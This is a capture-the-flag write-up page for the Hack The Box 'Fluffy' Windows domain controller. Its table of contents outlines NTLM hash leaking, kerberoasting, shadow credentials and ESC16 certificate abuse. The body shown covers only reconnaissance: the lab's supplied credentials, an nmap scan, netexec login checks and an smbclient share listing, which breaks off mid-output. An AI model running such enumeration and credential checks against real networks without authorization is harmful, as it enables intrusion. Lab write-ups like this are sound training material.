  <span class="md-ellipsis">
    WinPEAS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../XSS/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    XSS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certificates/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certificates
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntemplate/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntemplate
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../codereview/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    codereview
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../commandinjection/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    commandinjection
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../gpo/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    gpo
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../linux/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    linux
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../history/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    history
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../laps/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    LAPS
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../mssql/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    mssql
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC1/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC1
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Impersonation/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Impersonation
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../Vhosts/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    Vhosts
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC16/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC16
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../certvulntoESC15/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    certvulntoESC15
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../shadowcredential/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    shadowcredential
    
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../ADdisabledaccount/" class="md-nav__link">
        
  
  
  <span class="md-ellipsis">
    ADdisabledaccount
    
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#intro" class="md-nav__link">
    <span class="md-ellipsis">
      Intro
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reconnaissance" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reconnaissance">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#correlating-creds-with-services" class="md-nav__link">
    <span class="md-ellipsis">
      Correlating creds with services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-jfleischman" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as j.fleischman
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration as j.fleischman">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#inspecting-shares-contents" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting share's contents
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inspecting share&#39;s contents">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#inspecting-the-pdf-file" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the PDF file
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Inspecting the PDF file">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#analyzing-the-cves-mentioned-inside-the-pdf" class="md-nav__link">
    <span class="md-ellipsis">
      Analyzing the CVEs mentioned inside the PDF
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#inspecting-the-rest-of-the-files" class="md-nav__link">
    <span class="md-ellipsis">
      Inspecting the rest of the files
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#foothold" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Foothold">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#exploiting-cve-2025-24071-leaking-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting CVE-2025-24071 (Leaking NTLM hash)
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting CVE-2025-24071 (Leaking NTLM hash)">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#uploading-the-script-via-smbclient" class="md-nav__link">
    <span class="md-ellipsis">
      Uploading the script via smbclient
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#listen-for-incoming-connections" class="md-nav__link">
    <span class="md-ellipsis">
      Listen for incoming connections
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#cracking-ntlm-hash" class="md-nav__link">
    <span class="md-ellipsis">
      Cracking NTLM hash
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#correlating-creds-with-services_1" class="md-nav__link">
    <span class="md-ellipsis">
      Correlating creds with services
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ldap-enumeration-as-pagila" class="md-nav__link">
    <span class="md-ellipsis">
      LDAP enumeration as p.agila
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-enumeration-as-pagila" class="md-nav__link">
    <span class="md-ellipsis">
      SMB enumeration as p.agila
    </span>
  </a>
  
    <nav class="md-nav" aria-label="SMB enumeration as p.agila">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#enumerating-users" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating Users
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#enumerating-groups" class="md-nav__link">
    <span class="md-ellipsis">
      Enumerating Groups
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-hashes-of-kerberoastable-accounts" class="md-nav__link">
    <span class="md-ellipsis">
      Finding hashes of kerberoastable accounts
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attempting-to-crack-hashes" class="md-nav__link">
    <span class="md-ellipsis">
      Attempting to crack hashes
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bloodhound-as-pagila" class="md-nav__link">
    <span class="md-ellipsis">
      Bloodhound as p.agila
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#add-user-to-group" class="md-nav__link">
    <span class="md-ellipsis">
      Add user to group
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Add user to group">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#how-to-take-advantage-of-genericwrite" class="md-nav__link">
    <span class="md-ellipsis">
      How to take advantage of GenericWrite ?
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#what-are-shadow-credentials" class="md-nav__link">
    <span class="md-ellipsis">
      What are shadow credentials ?
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#adding-shadow-credential" class="md-nav__link">
    <span class="md-ellipsis">
      Adding Shadow Credential
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Adding Shadow Credential">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#towards-winrm_svc" class="md-nav__link">
    <span class="md-ellipsis">
      Towards WINRM_SVC
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#towards-ca_svc" class="md-nav__link">
    <span class="md-ellipsis">
      Towards CA_SVC
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#privesc" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Privesc">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#searching-for-vulnerable-certificates" class="md-nav__link">
    <span class="md-ellipsis">
      Searching for vulnerable certificates
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#exploiting-esc16" class="md-nav__link">
    <span class="md-ellipsis">
      Exploiting ESC16
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Exploiting ESC16">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-read-the-original-upn-of-the-victim-account-optional-for-recovery" class="md-nav__link">
    <span class="md-ellipsis">
      1 : Read the original UPN of the victim account (optional - for recovery).
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-update-the-victim-accounts-upn-to-that-of-the-target-administrator-samaccountname" class="md-nav__link">
    <span class="md-ellipsis">
      2: Update the victim account’s UPN to that of the target administrator sAMAccountName.
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-request-a-certificate-issued-as-the-victim-user-from-any-appropriate-client-authentication-template-eg-user-on-the-ca-vulnerable-to-esc16" class="md-nav__link">
    <span class="md-ellipsis">
      3: Request a certificate issued as the "victim" user from any appropriate client authentication template* (e.g., "user") on the CA vulnerable to ESC16
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#4-request-a-certificate" class="md-nav__link">
    <span class="md-ellipsis">
      **4. Request a certificate
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-restore-the-upn-of-the-victim-account" class="md-nav__link">
    <span class="md-ellipsis">
      5 : Restore the UPN of the "victim" account.
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#6-authenticate-as-the-target-administrator" class="md-nav__link">
    <span class="md-ellipsis">
      6 : Authenticate as the target administrator.
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#summary" class="md-nav__link">
    <span class="md-ellipsis">
      Summary
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Summary">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#reconnaissance_1" class="md-nav__link">
    <span class="md-ellipsis">
      Reconnaissance
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#foothold_1" class="md-nav__link">
    <span class="md-ellipsis">
      Foothold
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#privesc_1" class="md-nav__link">
    <span class="md-ellipsis">
      Privesc
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#sidenotes" class="md-nav__link">
    <span class="md-ellipsis">
      Sidenotes
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  



<h2 id="intro">Intro</h2>
<p><img alt="" src="../MediaFiles/Pasted%20image%2020250921133147.png" /><br />
Description:<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>As is common in real life Windows pentests, you will start the Fluffy box with credentials for the following account: j.fleischman / J0elTHEM4n1990!, so its an assumed breach scenario
</span></code></pre></div><br />
[[windows]] [[AssumedBreach]]  [[certificates]] [[certvulntoESC16]] [[shadowcredential]]<br />
Tags: #windows #AssumedBreach  #certificates #certvulntoESC16 #shadowcredential<br />
Tools used:<br />
- smbclient (SMB enumeration)<br />
- crackmapexec (SMB enumeration)<br />
- responder (receiving incoming connection for NTLM leak)<br />
- john the ripper (NTLM hash cracking)<br />
- GetUserSPNs.py (identifying kerberoastable accounts)<br />
- certipy (managing certificates)</p>
<hr />
<h1 id="reconnaissance">Reconnaissance</h1>
<p>add machine to etc/hosts<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;10.10.11.69 fluffy.htb&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>-a<span class="w"> </span>/etc/hosts
</span></code></pre></div></p>
<p>lets start with our nmap scan<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>nmap<span class="w"> </span>fluffy.htb<span class="w"> </span>-sV<span class="w"> </span>-Pn<span class="w"> </span>-T4
</span></code></pre></div><br />
output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.94SVN<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2025</span>-06-03<span class="w"> </span><span class="m">21</span>:08<span class="w"> </span>EEST
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>fluffy.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.69<span class="o">)</span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.055s<span class="w"> </span>latency<span class="o">)</span>.
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">990</span><span class="w"> </span>filtered<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>no-response<span class="o">)</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>PORT<span class="w">     </span>STATE<span class="w"> </span>SERVICE<span class="w">       </span>VERSION
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="m">53</span>/tcp<span class="w">   </span>open<span class="w">  </span>domain<span class="w">        </span>Simple<span class="w"> </span>DNS<span class="w"> </span>Plus
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="m">88</span>/tcp<span class="w">   </span>open<span class="w">  </span>kerberos-sec<span class="w">  </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Kerberos<span class="w"> </span><span class="o">(</span>server<span class="w"> </span>time:<span class="w"> </span><span class="m">2025</span>-06-04<span class="w"> </span><span class="m">01</span>:09:07Z<span class="o">)</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a><span class="m">139</span>/tcp<span class="w">  </span>open<span class="w">  </span>netbios-ssn<span class="w">   </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>netbios-ssn
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="m">389</span>/tcp<span class="w">  </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>fluffy.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="m">445</span>/tcp<span class="w">  </span>open<span class="w">  </span>microsoft-ds?
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="m">464</span>/tcp<span class="w">  </span>open<span class="w">  </span>kpasswd5?
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="m">593</span>/tcp<span class="w">  </span>open<span class="w">  </span>ncacn_http<span class="w">    </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>RPC<span class="w"> </span>over<span class="w"> </span>HTTP<span class="w"> </span><span class="m">1</span>.0
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="m">636</span>/tcp<span class="w">  </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>fluffy.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="m">3268</span>/tcp<span class="w"> </span>open<span class="w">  </span>ldap<span class="w">          </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>fluffy.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="m">3269</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssl/ldap<span class="w">      </span>Microsoft<span class="w"> </span>Windows<span class="w"> </span>Active<span class="w"> </span>Directory<span class="w"> </span>LDAP<span class="w"> </span><span class="o">(</span>Domain:<span class="w"> </span>fluffy.htb0.,<span class="w"> </span>Site:<span class="w"> </span>Default-First-Site-Name<span class="o">)</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>Service<span class="w"> </span>Info:<span class="w"> </span>Host:<span class="w"> </span>DC01<span class="p">;</span><span class="w"> </span>OS:<span class="w"> </span>Windows<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:microsoft:windows
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a>Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a>Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">51</span>.78<span class="w"> </span>seconds
</span></code></pre></div><br />
Discovered classic AD ports: DNS (53), Kerberos (88), LDAP (389/636/3268/3269), SMB (139/445), WinRM (5985), RPC (135/593). Host reported as <code>DC01</code> (Windows Server 2019).</p>
<p>Next, this is an assumed breach scenario, meaning we have already compromised a user (see machine's description):<br />
<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>j.fleischman
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>J0elTHEM4n1990!
</span></code></pre></div></p>
<h2 id="correlating-creds-with-services">Correlating creds with services</h2>
<div class="language-shell highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span>fluffy.htb<span class="w"> </span>-u<span class="w"> </span><span class="s1">&#39;j.fleischman&#39;</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;J0elTHEM4n1990!&#39;</span>
</span></code></pre></div>
<p>i made a script for automatic the netexec procedure for the services i wanted to test</p>
<p>output:<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>┌─<span class="o">[</span>ch3ckm8@parrot<span class="o">]</span>─<span class="o">[</span>~<span class="o">]</span>
</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>└──╼<span class="w"> </span>$./nxc_services_checker.sh
</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>mssql<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>smb<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-6-6"><a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\j</span>.fleischman:J0elTHEM4n1990!<span class="w"> </span>
</span><span id="__span-6-7"><a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>ftp<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-8"><a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>ldap<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-9"><a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>LDAP<span class="w">        </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">389</span><span class="w">    </span>fluffy.htb<span class="w">       </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Error<span class="w"> </span>retrieving<span class="w"> </span>os<span class="w"> </span>arch<span class="w"> </span>of<span class="w"> </span><span class="m">10</span>.10.11.69:<span class="w"> </span>Could<span class="w"> </span>not<span class="w"> </span>connect:<span class="w"> </span>timed<span class="w"> </span>out
</span><span id="__span-6-10"><a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>SMB<span class="w">         </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">445</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span><span class="w"> </span><span class="o">(</span>signing:True<span class="o">)</span><span class="w"> </span><span class="o">(</span>SMBv1:False<span class="o">)</span>
</span><span id="__span-6-11"><a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>LDAP<span class="w">        </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">389</span><span class="w">    </span>DC01<span class="w">             </span><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\j</span>.fleischman:J0elTHEM4n1990!<span class="w"> </span>
</span><span id="__span-6-12"><a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>rdp<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-13"><a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>ssh<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-14"><a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>winrm<span class="w"> </span>on<span class="w"> </span>fluffy.htb
</span><span id="__span-6-15"><a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Windows<span class="w"> </span><span class="m">10</span><span class="w"> </span>/<span class="w"> </span>Server<span class="w"> </span><span class="m">2019</span><span class="w"> </span>Build<span class="w"> </span><span class="m">17763</span><span class="w"> </span><span class="o">(</span>name:DC01<span class="o">)</span><span class="w"> </span><span class="o">(</span>domain:fluffy.htb<span class="o">)</span>
</span><span id="__span-6-16"><a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>WINRM<span class="w">       </span><span class="m">10</span>.10.11.69<span class="w">     </span><span class="m">5985</span><span class="w">   </span>DC01<span class="w">             </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>fluffy.htb<span class="se">\j</span>.fleischman:J0elTHEM4n1990!
</span></code></pre></div><br />
so right here, it seems that login to SMB is successful, so lets start there</p>
<h2 id="smb-enumeration-as-jfleischman">SMB enumeration as j.fleischman</h2>
<p>Lets start enumerating shares with smb client<br />
<div class="language-Shell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>smbclient<span class="w"> </span>-U<span class="w"> </span>j.fleischman<span class="w"> </span>-L<span class="w"> </span>fluffy.htb
</span></code></pre></div><br />
output<br />
<div class="language-shell highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>└──╼<span class="w"> </span><span class="nv">$smbclient</span><span class="w"> </span>-U<span class="w"> </span>j.fleischman<span class="w"> </span>-L<span class="w"> </span>fluffy.htb
</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Password<span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="o">[</span>WORKGROUP<span class="se">\j</span>.fleischman<span class="o">]</span>:
</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="w">    </span>Sharename<span class="w">       </span>Type<span class="w">      </span>Comment
